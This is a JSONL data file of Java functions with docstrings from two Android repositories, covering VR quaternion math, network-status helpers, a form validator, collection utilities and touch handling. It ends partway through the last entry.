{"docstring": "// call in gl thread\n", "func_signal": "public void reset()", "code": "{\n    mDeltaX = mDeltaY = 0;\n    Matrix.setIdentityM(mSensorMatrix,0);\n    mWorldRotationMatrixInvalidate = true;\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\MD360Director.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/** Get the roll euler angle in radians, which is the rotation around the z axis. Requires that this quaternion is normalized.\n * @return the rotation around the z axis in radians (between -PI and +PI) */\n", "func_signal": "public float getRollRad ()", "code": "{\n    float w = q[0];\n    float x = q[1];\n    float y = q[2];\n    float z = q[3];\n\n    final int pole = getGimbalPole();\n    return pole == 0 ? MathUtils.atan2(2f * (w * z + y * x), 1f - 2f * (x * x + z * z)) : (float)pole * 2f\n            * MathUtils.atan2(y, w);\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/** Get the pitch euler angle in radians, which is the rotation around the x axis. Requires that this quaternion is normalized.\n * @return the rotation around the x axis in radians (between -(PI/2) and +(PI/2)) */\n", "func_signal": "public float getPitchRad ()", "code": "{\n    float w = q[0];\n    float x = q[1];\n    float y = q[2];\n    float z = q[3];\n\n    final int pole = getGimbalPole();\n    return pole == 0 ? (float)Math.asin(MathUtils.clamp(2f * (w * x - z * y), -1f, 1f)) : (float)pole * MathUtils.PI * 0.5f;\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * \u5224\u65ad\u662f\u5426\u6709\u7f51\u7edc\u8fde\u63a5\n *\n * @param context\n * @return\n */\n", "func_signal": "public static boolean isNetworkConnected(Context context)", "code": "{\n    if (context != null) {\n        ConnectivityManager mConnectivityManager = (ConnectivityManager) context\n                .getSystemService(Context.CONNECTIVITY_SERVICE);\n        NetworkInfo mNetworkInfo = mConnectivityManager\n                .getActiveNetworkInfo();\n        if (mNetworkInfo != null) {\n            return mNetworkInfo.isAvailable();\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\org\\cuieney\\videolife\\common\\net\\NetWorkUtil.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/** <p>\n * Sets the Quaternion from the given x-, y- and z-axis.\n * </p>\n *\n * <p>\n * Taken from Bones framework for JPCT, see http://www.aptalkarga.com/bones/ which in turn took it from Graphics Gem code at\n * ftp://ftp.cis.upenn.edu/pub/graphics/shoemake/quatut.ps.Z.\n * </p>\n *\n * @param normalizeAxes whether to normalize the axes (necessary when they contain scaling)\n * @param xx x-axis x-coordinate\n * @param xy x-axis y-coordinate\n * @param xz x-axis z-coordinate\n * @param yx y-axis x-coordinate\n * @param yy y-axis y-coordinate\n * @param yz y-axis z-coordinate\n * @param zx z-axis x-coordinate\n * @param zy z-axis y-coordinate\n * @param zz z-axis z-coordinate */\n", "func_signal": "private void setFromAxes (boolean normalizeAxes, float xx, float xy, float xz, float yx, float yy, float yz, float zx,\n                               float zy, float zz)", "code": "{\n    float w,x,y,z;\n    if (normalizeAxes) {\n        final float lx = 1f / MDVector3D.len(xx, xy, xz);\n        final float ly = 1f / MDVector3D.len(yx, yy, yz);\n        final float lz = 1f / MDVector3D.len(zx, zy, zz);\n        xx *= lx;\n        xy *= lx;\n        xz *= lx;\n        yx *= ly;\n        yy *= ly;\n        yz *= ly;\n        zx *= lz;\n        zy *= lz;\n        zz *= lz;\n    }\n    // the trace is the sum of the diagonal elements; see\n    // http://mathworld.wolfram.com/MatrixTrace.html\n    final float t = xx + yy + zz;\n\n    // we protect the division by s by ensuring that s>=1\n    if (t >= 0) { // |w| >= .5\n        float s = (float)Math.sqrt(t + 1); // |s|>=1 ...\n        w = 0.5f * s;\n        s = 0.5f / s; // so this division isn't bad\n        x = (zy - yz) * s;\n        y = (xz - zx) * s;\n        z = (yx - xy) * s;\n    } else if ((xx > yy) && (xx > zz)) {\n        float s = (float)Math.sqrt(1.0 + xx - yy - zz); // |s|>=1\n        x = s * 0.5f; // |x| >= .5\n        s = 0.5f / s;\n        y = (yx + xy) * s;\n        z = (xz + zx) * s;\n        w = (zy - yz) * s;\n    } else if (yy > zz) {\n        float s = (float)Math.sqrt(1.0 + yy - xx - zz); // |s|>=1\n        y = s * 0.5f; // |y| >= .5\n        s = 0.5f / s;\n        x = (yx + xy) * s;\n        z = (zy + yz) * s;\n        w = (xz - zx) * s;\n    } else {\n        float s = (float)Math.sqrt(1.0 + zz - xx - yy); // |s|>=1\n        z = s * 0.5f; // |z| >= .5\n        s = 0.5f / s;\n        x = (xz + zx) * s;\n        y = (zy + yz) * s;\n        w = (yx - xy) * s;\n    }\n\n    set(w, x, y, z);\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "// call in gl thread\n", "func_signal": "public void updateSensorMatrix(float[] sensorMatrix)", "code": "{\n    System.arraycopy(sensorMatrix, 0, mSensorMatrix, 0, 16);\n    mWorldRotationMatrixInvalidate = true;\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\MD360Director.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/** Sets the quaternion components from the given axis and angle around that axis.\n * @param x X direction of the axis\n * @param y Y direction of the axis\n * @param z Z direction of the axis\n * @param radians The angle in radians\n * @return This quaternion for chaining. */\n", "func_signal": "public void setFromAxisRad (final float x, final float y, final float z, final float radians)", "code": "{\n    float d = MDVector3D.len(x, y, z);\n    if (d == 0f){\n        idt();\n        return;\n    }\n\n    d = 1f / d;\n    float l_ang = radians < 0 ? MathUtils.PI2 - (-radians % MathUtils.PI2) : radians % MathUtils.PI2;\n    float l_sin = (float)Math.sin(l_ang / 2);\n    float l_cos = (float)Math.cos(l_ang / 2);\n    this.set(l_cos, d * x * l_sin, d * y * l_sin, d * z * l_sin);\n    this.nor();\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * \u5224\u65adMOBILE \u7f51\u7edc\u662f\u5426\u53ef\u7528\n *\n * @param context\n * @return\n */\n", "func_signal": "public static boolean isMobileConnected(Context context)", "code": "{\n    if (context != null) {\n        ConnectivityManager mConnectivityManager = (ConnectivityManager) context\n                .getSystemService(Context.CONNECTIVITY_SERVICE);\n        NetworkInfo mMobileNetworkInfo = mConnectivityManager\n                .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);\n        if (mMobileNetworkInfo != null) {\n            return mMobileNetworkInfo.isAvailable();\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\org\\cuieney\\videolife\\common\\net\\NetWorkUtil.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * handle touch touch to rotate the model\n *\n * @param distanceX x\n * @param distanceY y\n * @return true if handled.\n */\n", "func_signal": "@Override\npublic boolean handleDrag(final int distanceX, final int distanceY)", "code": "{\n    updateDragRunnable.handleDrag(distanceX, distanceY);\n    getGLHandler().post(updateDragRunnable);\n    return false;\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\strategy\\interactive\\InteractiveModeManager.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524d\u7f51\u7edc\u8fde\u63a5\u7684\u7c7b\u578b\u4fe1\u606f\n *\n * @param context\n * @return\n */\n", "func_signal": "public static int getConnectedType(Context context)", "code": "{\n    if (context != null) {\n        ConnectivityManager mConnectivityManager = (ConnectivityManager) context\n                .getSystemService(Context.CONNECTIVITY_SERVICE);\n        NetworkInfo mNetworkInfo = mConnectivityManager\n                .getActiveNetworkInfo();\n        if (mNetworkInfo != null && mNetworkInfo.isAvailable()) {\n            return mNetworkInfo.getType();\n        }\n    }\n    return -1;\n}", "path": "app\\src\\main\\java\\org\\cuieney\\videolife\\common\\net\\NetWorkUtil.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "// may called from multi thread\n", "func_signal": "public void create()", "code": "{\n    int glTexture = createTextureId();\n\n    if (glTexture != TEXTURE_EMPTY){\n        mTextureId = glTexture;\n    }\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\texture\\MD360Texture.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * \u7f51\u7edc\u662f\u5426\u53ef\u7528\n *\n * @param context\n * @return\n */\n", "func_signal": "public static boolean isNetworkAvailable(Context context)", "code": "{\n    if (context != null) {\n        ConnectivityManager connectivity = (ConnectivityManager) context\n                .getSystemService(Context.CONNECTIVITY_SERVICE);\n        if (connectivity == null) {\n            return false;\n        } else {\n            NetworkInfo[] info = connectivity.getAllNetworkInfo();\n\n            if (info != null) {\n                for (int i = 0; i < info.length; i++) {\n                    if (info[i].isConnected()) {\n                        return true;\n                    }\n                }\n            }\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\org\\cuieney\\videolife\\common\\net\\NetWorkUtil.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/** Get the pole of the gimbal lock, if any.\n * @return positive (+1) for north pole, negative (-1) for south pole, zero (0) when no gimbal lock */\n", "func_signal": "public int getGimbalPole ()", "code": "{\n    float w = q[0];\n    float x = q[1];\n    float y = q[2];\n    float z = q[3];\n\n    final float t = y * x + z * w;\n    return t > 0.499f ? 1 : (t < -0.499f ? -1 : 0);\n}", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * Returns individual application cache directory (for only video caching from Proxy). Cache directory will be\n * created on SD card <i>(\"/Android/data/[app_package_name]/cache/video-cache\")</i> if card is mounted .\n * Else - Android defines cache directory on device's file system.\n *\n * @param context Application context\n * @return Cache {@link File directory}\n */\n", "func_signal": "public static File getIndividualCacheDirectory(Context context)", "code": "{\n    File cacheDir = getCacheDirectory(context, true);\n    return new File(cacheDir, INDIVIDUAL_DIR_NAME);\n}", "path": "gsyVideoPlayer\\src\\main\\java\\com\\shuyu\\gsyvideoplayer\\utils\\StorageUtils.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "// w,x,y,z,\n", "func_signal": "private void set(float w, float x, float y, float z)", "code": "{\n       this.q[0] = w;\n       this.q[1] = x;\n       this.q[2] = y;\n       this.q[3] = z;\n   }", "path": "vrlib\\src\\main\\java\\com\\asha\\vrlib\\model\\MDQuaternion.java", "repo_name": "Cuieney/kotlin-life", "stars": 862, "license": "None", "language": "java", "size": 124338}
{"docstring": "/**\n * Convenience method for adding multiple {@link Rule}s for a single {@link View}.\n * \n * @param view\n *            The {@link View} to be validated.\n * @param rules\n *            {@link List} of {@link Rule}s associated with the view.\n * \n * @throws IllegalArgumentException\n *             If {@code rules} is {@code null}.\n */\n", "func_signal": "public void put(View view, List<Rule<?>> rules)", "code": "{\n\tif (rules == null) {\n\t\tthrow new IllegalArgumentException(\"\\'rules\\' cannot be null\");\n\t}\n\n\tfor (Rule<?> rule : rules) {\n\t\tput(view, rule);\n\t}\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/** Mapping without checking the cause (done in mapThrowable). */\n", "func_signal": "protected Integer mapThrowableFlat(Throwable throwable)", "code": "{\n    Class<? extends Throwable> throwableClass = throwable.getClass();\n    Integer resId = throwableToMsgIdMap.get(throwableClass);\n    if (resId == null) {\n        Class<? extends Throwable> closestClass = null;\n        Set<Entry<Class<? extends Throwable>, Integer>> mappings = throwableToMsgIdMap.entrySet();\n        for (Entry<Class<? extends Throwable>, Integer> mapping : mappings) {\n            Class<? extends Throwable> candidate = mapping.getKey();\n            if (candidate.isAssignableFrom(throwableClass)) {\n                if (closestClass == null || closestClass.isAssignableFrom(candidate)) {\n                    closestClass = candidate;\n                    resId = mapping.getValue();\n                }\n            }\n        }\n\n    }\n    return resId;\n}", "path": "src\\com\\android\\pc\\ioc\\event\\util\\ExceptionToResourceMapping.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * fragment\u91cc\u9762\u4f7f\u7528 \u81ea\u52a8\u53bb\u6ce8\u5165\u7ec4\u4ef6\n * @author gdpancheng@gmail.com 2013-10-22 \u4e0b\u534812:59:07\n * @param object\n * @param view\n * @return void\n */\n", "func_signal": "public static void injectFragment(Object object, View view)", "code": "{\n\tlong time = System.currentTimeMillis();\n\tContextUtils.getCreateInvokers(object.getClass());\n\n\t//-------------------------------------------------------------------------------------------------\n\t//\u56e0\u4e3afragment\u6709\u4e9b\u53c2\u6570\u53ef\u80fd\u8981\u5728\u7ec4\u4ef6\u7ed1\u5b9a\u4e4b\u524d\u8fdb\u884c\u521d\u59cb\u5316\n\tArrayList<InjectInvoker> jArrayList = ContextUtils.getContextInvokers(object.getClass(), InjectBefore.class);\n\tif (jArrayList != null) {\n\t\ttry {\n\t\t\tfor (InjectInvoker injectInvoker : jArrayList) {\n\t\t\t\tinjectInvoker.invoke(object);\n\t\t\t}\n\t\t} catch (Exception e) {\n\t\t\tStringWriter buf = new StringWriter();\n\t\t\tPrintWriter w = new PrintWriter(buf);\n\t\t\te.printStackTrace(w);\n\t\t\tIoc.getIoc().getLogger().e(object.getClass().getSimpleName() + \"  \u91cc\u9762\u51fa\u9519\u4e86 \u8bf7\u68c0\u67e5\\n\" + buf.toString());\n\t\t}\n\t}\n\t//-------------------------------------------------------------------------------------------------\n\t\n\tArrayList<InjectInvoker> arrayList = ContextUtils.getViewInvokers(object.getClass(), view, null);\n\tfor (InjectInvoker injectInvoker : arrayList) {\n\t\tinjectInvoker.invoke(object);\n\t}\n\tIoc.getIoc().getLogger().d(object.getClass() + \" UI\u52a0\u8f7d\u8017\u65f6 \" + (System.currentTimeMillis() - time));\n}", "path": "src\\com\\android\\pc\\util\\Handler_Inject.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Validate all the {@link Rule}s against their {@link View}s.\n * \n * @throws IllegalStateException\n *             If a {@link ValidationListener} is not registered.\n */\n", "func_signal": "public synchronized void validate()", "code": "{\n\tif (mValidationListener == null) {\n\t\tthrow new IllegalStateException(\"Set a \" + ValidationListener.class.getSimpleName() + \" before attempting to validate.\");\n\t}\n\n\tViewRulePair failedViewRulePair = validateAllRules();\n\tif (failedViewRulePair == null) {\n\t\tmValidationListener.onValidationSucceeded();\n\t} else {\n\t\tmValidationListener.onValidationFailed(failedViewRulePair.view, failedViewRulePair.rule);\n\t}\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * @param list\n * @param array\n */\n", "func_signal": "public static <T> void addAll(Collection<T> list, T[] array)", "code": "{\n\tfor (T value : array) {\n\t\tlist.add(value);\n\t}\n}", "path": "src\\com\\android\\pc\\ioc\\core\\kernel\\KernelCollection.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * @param collection\n * @return\n */\n", "func_signal": "public static Map toMap(Collection collection)", "code": "{\n\tif (collection == null) {\n\t\treturn null;\n\t}\n\n\tMap map = new HashMap();\n\tObject key = null;\n\tfor (Object el : collection) {\n\t\tif (key == null) {\n\t\t\tkey = el;\n\n\t\t} else {\n\t\t\tmap.put(key, el);\n\t\t\tkey = null;\n\t\t}\n\t}\n\n\treturn map;\n}", "path": "src\\com\\android\\pc\\ioc\\core\\kernel\\KernelCollection.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Add a {@link View} and it's associated {@link Rule} to the Validator.\n * \n * @param view\n *            The {@link View} to be validated.\n * @param rule\n *            The {@link Rule} associated with the view.\n * \n * @throws IllegalArgumentException\n *             If {@code rule} is {@code null}.\n */\n", "func_signal": "public void put(View view, Rule<?> rule)", "code": "{\n\tif (rule == null) {\n\t\tthrow new IllegalArgumentException(\"'rule' cannot be null\");\n\t}\n\n\tmViewsAndRules.add(new ViewRulePair(view, rule));\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Validates all rules added to this Validator.\n * \n * @return {@code null} if all {@code Rule}s are valid, else returns the failed {@code ViewRulePair}.\n */\n", "func_signal": "private ViewRulePair validateAllRules()", "code": "{\n\tif (!mAnnotationsProcessed) {\n\t\tcreateRulesFromAnnotations(getSaripaarAnnotatedFields());\n\t\tmAnnotationsProcessed = true;\n\t}\n\n\tif (mViewsAndRules.size() == 0) {\n\t\tLog.i(TAG, \"No rules found. Passing validation by default.\");\n\t\treturn null;\n\t}\n\n\tViewRulePair failedViewRulePair = null;\n\tfor (ViewRulePair pair : mViewsAndRules) {\n\t\tif (pair == null)\n\t\t\tcontinue;\n\n\t\t// Validate views only if they are visible and enabled\n\t\tif (pair.view != null) {\n\t\t\tif (!pair.view.isShown() || !pair.view.isEnabled())\n\t\t\t\tcontinue;\n\t\t}\n\n\t\tif (!pair.rule.isValid(pair.view)) {\n\t\t\tfailedViewRulePair = pair;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn failedViewRulePair;\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Asynchronously validates all the {@link Rule}s against their {@link View}s. Subsequent calls to this method will cancel any pending asynchronous validations and start a new one.\n * \n * @throws IllegalStateException\n *             If a {@link ValidationListener} is not registered.\n */\n", "func_signal": "public void validateAsync()", "code": "{\n\tif (mValidationListener == null) {\n\t\tthrow new IllegalStateException(\"Set a \" + ValidationListener.class.getSimpleName() + \" before attempting to validate.\");\n\t}\n\n\t// Cancel the existing task\n\tif (mAsyncValidationTask != null) {\n\t\tmAsyncValidationTask.cancel(true);\n\t\tmAsyncValidationTask = null;\n\t}\n\n\t// Start a new one ;)\n\tmAsyncValidationTask = new AsyncTask<Void, Void, ViewRulePair>() {\n\n\t\t@Override\n\t\tprotected ViewRulePair doInBackground(Void... params) {\n\t\t\treturn validateAllRules();\n\t\t}\n\n\t\t@Override\n\t\tprotected void onPostExecute(ViewRulePair pair) {\n\t\t\tif (pair == null) {\n\t\t\t\tmValidationListener.onValidationSucceeded();\n\t\t\t} else {\n\t\t\t\tmValidationListener.onValidationFailed(pair.view, pair.rule);\n\t\t\t}\n\n\t\t\tmAsyncValidationTask = null;\n\t\t}\n\n\t\t@Override\n\t\tprotected void onCancelled() {\n\t\t\tmAsyncValidationTask = null;\n\t\t}\n\t};\n\n\tmAsyncValidationTask.execute((Void[]) null);\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Updates a property value if it exists, else creates a new one.\n * \n * @param name\n *            The property name.\n * @param value\n *            Value of the property.\n * \n * @throws IllegalArgumentException\n *             If {@code name} is {@code null}.\n */\n", "func_signal": "public void setProperty(String name, Object value)", "code": "{\n\tif (name == null) {\n\t\tthrow new IllegalArgumentException(\"\\'name\\' cannot be null\");\n\t}\n\n\tmProperties.put(name, value);\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Creates a new {@link Validator}.\n * \n * @param controller\n *            The instance that holds references to the Views that are being validated. Usually an {@code Activity} or a {@code Fragment}. Also accepts controller instances that have annotated {@code View} references.\n */\n", "func_signal": "public Validator(Object controller)", "code": "{\n\tthis();\n\tif (controller == null) {\n\t\tthrow new IllegalArgumentException(\"'controller' cannot be null\");\n\t}\n\tmController = controller;\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Private constructor. Cannot be instantiated.\n */\n", "func_signal": "private Validator()", "code": "{\n\tmAnnotationsProcessed = false;\n\tmViewsAndRules = new ArrayList<Validator.ViewRulePair>();\n\tmProperties = new HashMap<String, Object>();\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Retrieves the value of the given property.\n * \n * @param name\n *            The property name.\n * \n * @throws IllegalArgumentException\n *             If {@code name} is {@code null}.\n * \n * @return Value of the property or {@code null} if the property does not exist.\n */\n", "func_signal": "public Object getProperty(String name)", "code": "{\n\tif (name == null) {\n\t\tthrow new IllegalArgumentException(\"\\'name\\' cannot be null\");\n\t}\n\n\treturn mProperties.get(name);\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/** Looks at the exception and its causes trying to find an ID. */\n", "func_signal": "public Integer mapThrowable(final Throwable throwable)", "code": "{\n    Throwable throwableToCheck = throwable;\n    int depthToGo = 20;\n\n    while (true) {\n        Integer resId = mapThrowableFlat(throwableToCheck);\n        if (resId != null) {\n            return resId;\n        } else {\n            throwableToCheck = throwableToCheck.getCause();\n            depthToGo--;\n            if (depthToGo <= 0 || throwableToCheck == throwable || throwableToCheck == null) {\n                Log.d(EventBus.TAG, \"No specific message ressource ID found for \" + throwable);\n                // return config.defaultErrorMsgId;\n                return null;\n            }\n        }\n    }\n\n}", "path": "src\\com\\android\\pc\\ioc\\event\\util\\ExceptionToResourceMapping.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Used to annotate a password field. Passwords are always required.\n *\n * @author Ragunath Jawahar <rj@mobsandgeeks.com>\n */\n", "func_signal": "@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Password", "code": "{\n    public int order();\n    public int minLength()      default 0;\n    public int maxLength()      default Integer.MAX_VALUE;\n    public boolean trim()       default true;\n    public String message()     default \"Password is required\";\n    public int messageResId()   default 0;\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\annotation\\Password.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Removes all the rules for the matching {@link View}\n * \n * @param view\n *            The {@code View} whose rules must be removed.\n */\n", "func_signal": "public void removeRulesFor(View view)", "code": "{\n\tif (view == null) {\n\t\tthrow new IllegalArgumentException(\"'view' cannot be null\");\n\t}\n\n\tint index = 0;\n\twhile (index < mViewsAndRules.size()) {\n\t\tViewRulePair pair = mViewsAndRules.get(index);\n\t\tif (pair.view == view) {\n\t\t\tmViewsAndRules.remove(index);\n\t\t\tcontinue;\n\t\t}\n\n\t\tindex++;\n\t}\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * @param list\n * @param componentType\n * @return\n */\n", "func_signal": "public static <T> T[] toArray(Collection<? extends T> collection, Class<T> componentType)", "code": "{\n\tif (collection == null) {\n\t\treturn null;\n\t}\n\n\tT[] array = (T[]) Array.newInstance(componentType, collection.size());\n\tint i = 0;\n\tfor (T el : collection) {\n\t\tarray[i++] = el;\n\t}\n\n\treturn array;\n}", "path": "src\\com\\android\\pc\\ioc\\core\\kernel\\KernelCollection.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * @param collection\n * @param to\n */\n", "func_signal": "public static void copy(Collection collection, Collection to)", "code": "{\n\tfor (Object el : collection) {\n\t\tto.add(el);\n\t}\n}", "path": "src\\com\\android\\pc\\ioc\\core\\kernel\\KernelCollection.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Cancels the asynchronous validation task if running, useful only when you run the Validator in asynchronous mode using the {@code validateAsync} method.\n * \n * @return True if the asynchronous task was cancelled.\n */\n", "func_signal": "public boolean cancelAsync()", "code": "{\n\tboolean cancelled = false;\n\tif (mAsyncValidationTask != null) {\n\t\tcancelled = mAsyncValidationTask.cancel(true);\n\t\tmAsyncValidationTask = null;\n\t}\n\n\treturn cancelled;\n}", "path": "src\\com\\android\\pc\\ioc\\verification\\Validator.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * @param collection\n * @param componentType\n * @return\n */\n", "func_signal": "public static <T> T[] castToArray(Collection collection, Class<T> componentType)", "code": "{\n\tif (collection == null) {\n\t\treturn null;\n\t}\n\n\tT[] array = (T[]) Array.newInstance(componentType, collection.size());\n\tint i = 0;\n\tfor (Object el : collection) {\n\t\tarray[i++] = KernelDyna.to(el, componentType);\n\t}\n\n\treturn array;\n}", "path": "src\\com\\android\\pc\\ioc\\core\\kernel\\KernelCollection.java", "repo_name": "gdpancheng/LoonAndroid", "stars": 577, "license": "None", "language": "java", "size": 16475}
{"docstring": "/**\n * Process a touch event received by the parent view. This method will\n * dispatch callback events as needed before returning. The parent view's\n * onTouchEvent implementation should call this.\n *\n * @param ev\n *            The touch event received by the parent view\n */\n", "func_signal": "public void processTouchEvent(MotionEvent ev)", "code": "{\n\tfinal int action = MotionEventCompat.getActionMasked(ev);\n\tfinal int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n\tif (action == MotionEvent.ACTION_DOWN) {\n\t\t// Reset things for a new event stream, just in case we didn't get\n\t\t// the whole previous stream.\n\t\tcancel();\n\t}\n\n\tif (mVelocityTracker == null) {\n\t\tmVelocityTracker = VelocityTracker.obtain();\n\t}\n\tmVelocityTracker.addMovement(ev);\n\n\tswitch (action) {\n\tcase MotionEvent.ACTION_DOWN: {\n\t\tfinal float x = ev.getX();\n\t\tfinal float y = ev.getY();\n\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, 0);\n\t\tfinal View toCapture = findTopChildUnder((int) x, (int) y);\n\n\t\tsaveInitialMotion(x, y, pointerId);\n\n\t\t// Since the parent is already directly processing this touch event,\n\t\t// there is no reason to delay for a slop before dragging.\n\t\t// Start immediately if possible.\n\t\ttryCaptureViewForDrag(toCapture, pointerId);\n\n\t\tfinal int edgesTouched = mInitialEdgesTouched[pointerId];\n\t\tif ((edgesTouched & mTrackingEdges) != 0) {\n\t\t\tmCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n\t\t}\n\t\tbreak;\n\t}\n\n\tcase MotionEventCompat.ACTION_POINTER_DOWN: {\n\t\tfinal int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n\t\tfinal float x = MotionEventCompat.getX(ev, actionIndex);\n\t\tfinal float y = MotionEventCompat.getY(ev, actionIndex);\n\n\t\tsaveInitialMotion(x, y, pointerId);\n\n\t\t// A ViewDragHelper can only manipulate one view at a time.\n\t\tif (mDragState == STATE_IDLE) {\n\t\t\t// If we're idle we can do anything! Treat it like a normal down\n\t\t\t// event.\n\n\t\t\tfinal View toCapture = findTopChildUnder((int) x, (int) y);\n\t\t\ttryCaptureViewForDrag(toCapture, pointerId);\n\n\t\t\tfinal int edgesTouched = mInitialEdgesTouched[pointerId];\n\t\t\tif ((edgesTouched & mTrackingEdges) != 0) {\n\t\t\t\tmCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n\t\t\t}\n\t\t} else if (isCapturedViewUnder((int) x, (int) y)) {\n\t\t\t// We're still tracking a captured view. If the same view is\n\t\t\t// under this\n\t\t\t// point, we'll swap to controlling it with this pointer\n\t\t\t// instead.\n\t\t\t// (This will still work if we're \"catching\" a settling view.)\n\n\t\t\ttryCaptureViewForDrag(mCapturedView, pointerId);\n\t\t}\n\t\tbreak;\n\t}\n\n\tcase MotionEvent.ACTION_MOVE: {\n\t\tif (mDragState == STATE_DRAGGING) {\n\t\t\tfinal int index = MotionEventCompat.findPointerIndex(ev, mActivePointerId);\n\t\t\tfinal float x = MotionEventCompat.getX(ev, index);\n\t\t\tfinal float y = MotionEventCompat.getY(ev, index);\n\t\t\tfinal int idx = (int) (x - mLastMotionX[mActivePointerId]);\n\t\t\tfinal int idy = (int) (y - mLastMotionY[mActivePointerId]);\n\n\t\t\tdragTo(mCapturedView.getLeft() + idx, mCapturedView.getTop() + idy, idx, idy);\n\n\t\t\tsaveLastMotion(ev);\n\t\t} else {\n\t\t\t// Check to see if any pointer is now over a draggable view.\n\t\t\tfinal int pointerCount = MotionEventCompat.getPointerCount(ev);\n\t\t\tfor (int i = 0; i < pointerCount; 